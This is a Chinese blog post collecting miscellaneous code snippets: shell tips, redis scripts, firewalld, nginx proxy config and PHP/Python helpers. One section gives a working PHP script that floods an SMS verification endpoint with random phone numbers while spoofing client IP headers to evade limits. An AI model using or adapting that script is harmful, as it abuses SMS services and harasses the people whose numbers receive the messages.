  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/07/代码段收集/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="苏生不惑">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="苏生不惑的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/07/代码段收集/" itemprop="url">代码段收集</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-07T11:24:00+08:00">
                2019-01-07
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  21.5k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  111 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">echo -e <span class="string">"hell\bo"</span></span><br><span class="line">echo -e <span class="string">"h\te\tl\nl\to\t"</span></span><br><span class="line">echo -e <span class="string">"\x68\t\x65\t\x6c\n\x6c\t\x6f"</span></span><br><span class="line"><span class="comment">//30m=黑色，31m=红色，32m=绿色，33m=黄色，34m=蓝色，35m=洋红，36m=青色，37m=白色</span></span><br><span class="line">[root@VM_0_14_centos fonts]# echo -e "\e[1;31m字符串\e[0m"</span><br><span class="line">字符串</span><br><span class="line">alias</span><br><span class="line">alias 别名=<span class="string">'原命令'</span></span><br><span class="line">vim ~<span class="regexp">/.bashrc</span></span><br><span class="line"><span class="regexp">source ~/</span>.bashrc</span><br><span class="line">unalias 别名</span><br><span class="line">vim /etc/profile</span><br><span class="line">HISTSIZE=<span class="number">1000</span></span><br><span class="line">/dev/<span class="literal">null</span> 这个文件是系统的黑洞，输出信息写入这里面就没啦</span><br><span class="line">一个判断命令是否正确执行的做法</span><br><span class="line">ls &amp;&amp; echo yes || echo no</span><br><span class="line">netstat -an | grep ESTABLISHED | wc -l</span><br><span class="line"><span class="string">``</span> 反引号括起来的内容是系统命令，在Bash中会先执行它。和$()作用一样，不过推荐$()，因为反引号容易看错</span><br><span class="line">Bash中变量与PHP中的变量的区别是赋值不需要“$”，取值需要“$”</span><br></pre></td></tr></table></figure>
<h3 id="redis批量删除key"><a href="#redis批量删除key" class="headerlink" title="redis批量删除key"></a>redis批量删除key</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">从<span class="number">2.8</span><span class="number">.0</span>以后redis提供scan来遍历key，而且这个过程是非阻塞，不会影响线上生产环境。最终经过修改的方案是用scan遍历要删除的key，然后调用del删除</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys,redis</span><br><span class="line"></span><br><span class="line">r = redis.Redis(host=<span class="string">"127.0.0.1"</span>, port=<span class="number">6379</span>,db=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>  len(sys.argv) &lt;= <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">"必须指明匹配key字符串"</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line">pattern = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">cursor = <span class="number">0</span></span><br><span class="line">num = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span> :</span><br><span class="line">    resut = r.scan(cursor, pattern, <span class="number">10000</span>)</span><br><span class="line">    del_keys = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> resut[<span class="number">1</span>]:</span><br><span class="line">        key = i.decode()</span><br><span class="line">        del_keys.append(key)</span><br><span class="line">    #print("del keys len :%d" % len(result))</span><br><span class="line">    <span class="keyword">if</span> len(del_keys) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    r.delete(*del_keys)</span><br><span class="line">    cursor = resut[<span class="number">0</span>]</span><br><span class="line">    print(<span class="string">"delete keys num : %dw"</span> % (num))</span><br><span class="line">    num +=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"done\n"</span>)</span><br><span class="line">python3 main.py <span class="string">"king*"</span></span><br></pre></td></tr></table></figure>
<h3 id="centos7安装redis3-2"><a href="#centos7安装redis3-2" class="headerlink" title="centos7安装redis3.2"></a>centos7安装redis3.2</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">wget http:<span class="comment">//download.redis.io/releases/redis-3.2.4.tar.gz</span></span><br><span class="line"> </span><br><span class="line">tar -xvf redis<span class="number">-3.2</span><span class="number">.4</span>.tar.gz</span><br><span class="line"> </span><br><span class="line">cd redis<span class="number">-3.2</span><span class="number">.4</span></span><br><span class="line"> </span><br><span class="line">cat README.md</span><br><span class="line"> </span><br><span class="line">make</span><br><span class="line"> </span><br><span class="line">make install</span><br><span class="line"> </span><br><span class="line">mkdir /etc/redis</span><br><span class="line"> </span><br><span class="line">cp utils/redis.conf /etc/redis/</span><br><span class="line"> </span><br><span class="line">redis-server /etc/redis/redis.conf</span><br><span class="line"></span><br><span class="line">vi /lib/systemd/system/redis.service</span><br><span class="line">[Unit]</span><br><span class="line">Description=redis service file</span><br><span class="line">Wants=network.target</span><br><span class="line"> </span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">ExecStart=<span class="regexp">/usr/</span>local/bin/redis-server /etc/redis/redis.conf</span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"></span><br><span class="line">vi /etc/redis/redis.conf</span><br><span class="line">systemctl daemon-reload</span><br><span class="line"> </span><br><span class="line">#开机启动</span><br><span class="line"> </span><br><span class="line">systemctl enable redis.service</span><br><span class="line"> </span><br><span class="line">#启动redis</span><br><span class="line"> </span><br><span class="line">systemctl start redis.service</span><br><span class="line"> </span><br><span class="line">#关闭redis</span><br><span class="line"> </span><br><span class="line">systemctl stop redis.service</span><br></pre></td></tr></table></figure>
<h3 id="firewall"><a href="#firewall" class="headerlink" title="firewall"></a>firewall</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># systemctl start firewalld         # 启动,</span><br><span class="line"># systemctl enable firewalld        # 开机启动</span><br><span class="line"># systemctl stop firewalld          # 关闭</span><br><span class="line"># systemctl disable firewalld       # 取消开机启动</span><br><span class="line">查看运行状态:</span><br><span class="line"></span><br><span class="line">[root:~]# firewall-cmd –state</span><br><span class="line">running</span><br><span class="line"></span><br><span class="line">查看当前的区域：</span><br><span class="line"></span><br><span class="line">[root:~]# firewall-cmd –get-default-zone</span><br><span class="line">public</span><br><span class="line"></span><br><span class="line">查看已被激活的区域信息:</span><br><span class="line"></span><br><span class="line">[root:~]# firewall-cmd –get-active-zones</span><br><span class="line">public</span><br><span class="line">interfaces: eth0</span><br><span class="line"></span><br><span class="line">查询eth0网卡的区域：</span><br><span class="line"></span><br><span class="line">[root:~]# firewall-cmd –get-zone-of-interface=eth0</span><br><span class="line">public</span><br><span class="line">封禁 ip：</span><br><span class="line">[root:~]#firewall-cmd --permanent --add-rich-rule="rule family='ipv4' source address='222.222.222.222' reject"</span><br><span class="line">通过 ipset 来封禁 ip</span><br><span class="line">[root:~]#firewall-cmd --permanent --zone=public --new-ipset=blacklist --type=hash:ip</span><br><span class="line"> </span><br><span class="line">[root:~]#firewall-cmd --permanent --zone=public --ipset=blacklist --add-entry=222.222.222.222</span><br></pre></td></tr></table></figure>
<h3 id="nginx反向代理解决跨域问题"><a href="#nginx反向代理解决跨域问题" class="headerlink" title="nginx反向代理解决跨域问题"></a>nginx反向代理解决跨域问题</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">有<span class="number">2</span>个站点，front.aaa.com和api.aaa.com。假设这里我们<span class="number">2</span>个站点都用nginx搭建，front.aaa.com的nginx配置文件为front.conf，api.aaa.com的nginx的配置文件为api.conf。当front站点的页面ajax访问api站点的时候就会起因这个跨域问题。我们在front站点配置<span class="number">1</span>个针对api的反向代理，配置如下：</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">     ....</span><br><span class="line">       location /api/ &#123;</span><br><span class="line">            rewrite ^<span class="regexp">/api/</span>(.*) /$<span class="number">1</span> <span class="keyword">break</span>;</span><br><span class="line">            proxy_pass http:<span class="comment">//api.aaa.com;</span></span><br><span class="line">        &#125;</span><br><span class="line">        ....</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">如此一来所有访问api的接口我们可以同构http:<span class="comment">//front.aaa.com/api/&#123;realApi&#125;来实现对后端接口的访问。</span></span><br></pre></td></tr></table></figure>
<h3 id="数据结构算法"><a href="#数据结构算法" class="headerlink" title="数据结构算法"></a>数据结构算法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://laravel-china.org/topics/21967</span></span><br><span class="line">$array = array(</span><br><span class="line">    <span class="string">'a'</span> =&gt; array(</span><br><span class="line">        <span class="string">'a1'</span> =&gt; array(</span><br><span class="line">            <span class="string">'a1_1'</span> =&gt; array(</span><br><span class="line">                <span class="string">'a1_1_1'</span> =&gt; array(),</span><br><span class="line">            ),</span><br><span class="line">            <span class="string">'a1_2'</span> =&gt; array(),</span><br><span class="line">        ),</span><br><span class="line">        <span class="string">'a2'</span> =&gt; array(</span><br><span class="line">            <span class="string">'a2_1'</span> =&gt; array(),</span><br><span class="line">            <span class="string">'a2_2'</span> =&gt; array(),</span><br><span class="line">            <span class="string">'a2_3'</span> =&gt; array(),</span><br><span class="line">        )</span><br><span class="line">    ),</span><br><span class="line">    <span class="string">'b'</span> =&gt; array(),<span class="comment">//...n+1</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//print_r($array);</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fuck</span>(<span class="params">$data = array(</span>), &amp;<span class="title">$indirect_num</span> = 0)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    foreach ($data <span class="keyword">as</span> $key =&gt; $item) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($item) &amp;&amp; !empty($item)) &#123;</span><br><span class="line"></span><br><span class="line">            $item = fuck($item, $indirect_num);</span><br><span class="line"></span><br><span class="line">            $indirect_num += $item[<span class="string">'_direct_num'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        $data[$key] = $item;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//直接下级</span></span><br><span class="line">    $data[<span class="string">'_direct_num'</span>] = $direct_num = count($data);</span><br><span class="line">    <span class="comment">//间接下级</span></span><br><span class="line">    $data[<span class="string">'_indirect_num'</span>] = $indirect_num;</span><br><span class="line">    <span class="comment">//所有下级</span></span><br><span class="line">    $data[<span class="string">'_count_num'</span>] = $direct_num + $indirect_num;</span><br><span class="line">    <span class="comment">//排序</span></span><br><span class="line">    ksort($data);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line">print_r(fuck($array));</span><br></pre></td></tr></table></figure>
<h3 id="PHP-攻击短信验证码"><a href="#PHP-攻击短信验证码" class="headerlink" title="PHP 攻击短信验证码"></a>PHP 攻击短信验证码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//laravel-china.org/articles/22051</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl_post</span>(<span class="params">$url, array $params = array(</span>),<span class="title">$ip</span>, <span class="title">$timeout</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $this_header = array(</span><br><span class="line">        <span class="string">"charset=UTF-8"</span>,</span><br><span class="line">        <span class="string">'X-FORWARDED-FOR:'</span>.$ip,</span><br><span class="line">        <span class="string">'CLIENT-IP:'</span>.$ip</span><br><span class="line">    );</span><br><span class="line">    $ch = curl_init();<span class="comment">//初始化</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);<span class="comment">//抓取指定网页</span></span><br><span class="line">    curl_setopt($ch,CURLOPT_HTTPHEADER,$this_header);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);<span class="comment">//设置header</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);<span class="comment">//要求结果为字符串且输出到屏幕上</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);</span><br><span class="line">    curl_setopt($ch, CURLOPT_POST, <span class="number">1</span>);<span class="comment">//post提交方式</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);</span><br><span class="line">    curl_setopt($ch, CURLOPT_USERAGENT, <span class="string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/43.0.2357.81 Chrome/43.0.2357.81 Safari/537.36"</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    $data = curl_exec($ch);<span class="comment">//运行curl</span></span><br><span class="line">    curl_close($ch);</span><br><span class="line">    <span class="keyword">return</span> ($data);</span><br><span class="line">&#125;</span><br><span class="line">swoole_timer_tick(<span class="number">2000</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$timer_id</span>) </span>&#123;</span><br><span class="line">    $ip = get_rand_ip();</span><br><span class="line">    $phone = getPhone();</span><br><span class="line">    <span class="comment">//这里添加短信验证码接口ur，并传入对应手机号参数(参数key看你要攻击的接口是啥，我这里是phone)</span></span><br><span class="line">    $res = curl_post(<span class="string">'替换成短信接口url'</span>,[<span class="string">'phone'</span>=&gt;$phone],$ip,<span class="number">30</span>);</span><br><span class="line">    <span class="keyword">if</span>($res == <span class="string">'0'</span>)&#123;</span><br><span class="line">        echo <span class="string">'验证码发送成功phone:'</span>.$phone.<span class="string">'time:'</span>.date(<span class="string">'Y-m-d H:i:s'</span>).<span class="string">' 虚拟ip:'</span>.$ip.PHP_EOL;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        echo $res.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPhone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $arr = array(</span><br><span class="line">        <span class="number">130</span>,<span class="number">131</span>,<span class="number">132</span>,<span class="number">133</span>,<span class="number">134</span>,<span class="number">135</span>,<span class="number">136</span>,<span class="number">137</span>,<span class="number">138</span>,<span class="number">139</span>,</span><br><span class="line">        <span class="number">144</span>,<span class="number">147</span>,</span><br><span class="line">        <span class="number">150</span>,<span class="number">151</span>,<span class="number">152</span>,<span class="number">153</span>,<span class="number">155</span>,<span class="number">156</span>,<span class="number">157</span>,<span class="number">158</span>,<span class="number">159</span>,</span><br><span class="line">        <span class="number">176</span>,<span class="number">177</span>,<span class="number">178</span>,</span><br><span class="line">        <span class="number">180</span>,<span class="number">181</span>,<span class="number">182</span>,<span class="number">183</span>,<span class="number">184</span>,<span class="number">185</span>,<span class="number">186</span>,<span class="number">187</span>,<span class="number">188</span>,<span class="number">189</span>,</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> $arr[array_rand($arr)].mt_rand(<span class="number">1000</span>,<span class="number">9999</span>).mt_rand(<span class="number">1000</span>,<span class="number">9999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_rand_ip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $arr_1 = array(<span class="string">"218"</span>,<span class="string">"218"</span>,<span class="string">"66"</span>,<span class="string">"66"</span>,<span class="string">"218"</span>,<span class="string">"218"</span>,<span class="string">"60"</span>,<span class="string">"60"</span>,<span class="string">"202"</span>,<span class="string">"204"</span>,<span class="string">"66"</span>,<span class="string">"66"</span>,<span class="string">"66"</span>,<span class="string">"59"</span>,<span class="string">"61"</span>,<span class="string">"60"</span>,<span class="string">"222"</span>,<span class="string">"221"</span>,<span class="string">"66"</span>,<span class="string">"59"</span>,<span class="string">"60"</span>,<span class="string">"60"</span>,<span class="string">"66"</span>,<span class="string">"218"</span>,<span class="string">"218"</span>,<span class="string">"62"</span>,<span class="string">"63"</span>,<span class="string">"64"</span>,<span class="string">"66"</span>,<span class="string">"66"</span>,<span class="string">"122"</span>,<span class="string">"211"</span>);</span><br><span class="line">    $randarr= mt_rand(<span class="number">0</span>,count($arr_1));</span><br><span class="line">    $ip1id = $arr_1[$randarr];</span><br><span class="line">    $ip2id=  round(rand(<span class="number">600000</span>,  <span class="number">2550000</span>)  /  <span class="number">10000</span>);</span><br><span class="line">    $ip3id=  round(rand(<span class="number">600000</span>,  <span class="number">2550000</span>)  /  <span class="number">10000</span>);</span><br><span class="line">    $ip4id=  round(rand(<span class="number">600000</span>,  <span class="number">2550000</span>)  /  <span class="number">10000</span>);</span><br><span class="line">    <span class="keyword">return</span>  $ip1id . <span class="string">"."</span> . $ip2id . <span class="string">"."</span> . $ip3id . <span class="string">"."</span> . $ip4id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="get-object-vars"><a href="#get-object-vars" class="headerlink" title="get_object_vars"></a>get_object_vars</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">array get_object_vars ( object $obj ) 返回由 obj指定的对象中定义的属性组成的关联数组。</span><br><span class="line"></span><br><span class="line">如果是关联数组：数组转对象可以直接用(object)()；对象转数组则要用get_object_vars()；</span><br><span class="line"></span><br><span class="line">如果是索引数组：数组转对象可以直接用(object)()；对象转数组直接用(array)()；</span><br></pre></td></tr></table></figure>
<h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"># 十进制转二进制的方法：除2取余，逆序排列, https://blog.csdn.net/shirley_sweet/article/details/73896279</span><br><span class="line">def change(n):</span><br><span class="line">    result = <span class="string">'0'</span></span><br><span class="line">    if n == 0:  # 输入为0的情况</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = change(n <span class="comment">// 2)  # 调用自身</span></span><br><span class="line">        <span class="keyword">return</span> result + str(n % <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">def decimal_to_binary(decimal_val):</span><br><span class="line">    <span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">    十进制转为二进制</span></span><br><span class="line"><span class="string">    :param decimal_val:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    '</span><span class="string">''</span></span><br><span class="line">    print(<span class="string">'transfer %d to binary'</span> % decimal_val)</span><br><span class="line">    recursion_result = change(decimal_val)</span><br><span class="line">    print(<span class="string">'递归实现转换结果：'</span>, recursion_result)</span><br><span class="line"></span><br><span class="line">def binary_to_decimal_func(val):</span><br><span class="line">    <span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">    按照定义来实现，即 2^n 的形式</span></span><br><span class="line"><span class="string">    :param val: str</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    '</span><span class="string">''</span></span><br><span class="line">    print(<span class="string">'original val: '</span>, val)</span><br><span class="line">    numbers = len(val)</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(numbers):</span><br><span class="line">        result += int(val[i]) * pow(<span class="number">2</span>, numbers - i - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def binary_to_decimal(val):</span><br><span class="line">    <span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">    二进制转十进制</span></span><br><span class="line"><span class="string">    :param val:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    '</span><span class="string">''</span></span><br><span class="line">    decimal2 = binary_to_decimal_func(str(val))</span><br><span class="line">    print(<span class="string">'第二种转换二进制为十进制：'</span>, decimal2)</span><br></pre></td></tr></table></figure>
<h3 id="计算当前时间最近的-5-或-10-分钟"><a href="#计算当前时间最近的-5-或-10-分钟" class="headerlink" title="计算当前时间最近的 5 或 10 分钟"></a>计算当前时间最近的 5 或 10 分钟</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://ourcodeworld.com/articles/read/756/how-to-round-up-down-to-nearest-10-or-5-minutes-of-datetime-in-php</span></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">roundToNearestMinuteInterval</span>(<span class="params">\DateTime $dateTime, $minuteInterval = <span class="number">10</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $dateTime-&gt;setTime(</span><br><span class="line">        $dateTime-&gt;format(<span class="string">'H'</span>),</span><br><span class="line">        round($dateTime-&gt;format(<span class="string">'i'</span>) / $minuteInterval) * $minuteInterval,</span><br><span class="line">        <span class="number">0</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line">$date = <span class="keyword">new</span> DateTime(<span class="string">"2018-06-27 20:37:00"</span>);</span><br><span class="line"></span><br><span class="line">$date = roundToNearestMinuteInterval($date);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Rounded from 37 minutes to 40</span></span><br><span class="line"><span class="comment">//  2018-06-27 20:40:00</span></span><br><span class="line">echo $date-&gt;format(<span class="string">"Y-m-d H:i:s"</span>);</span><br></pre></td></tr></table></figure>
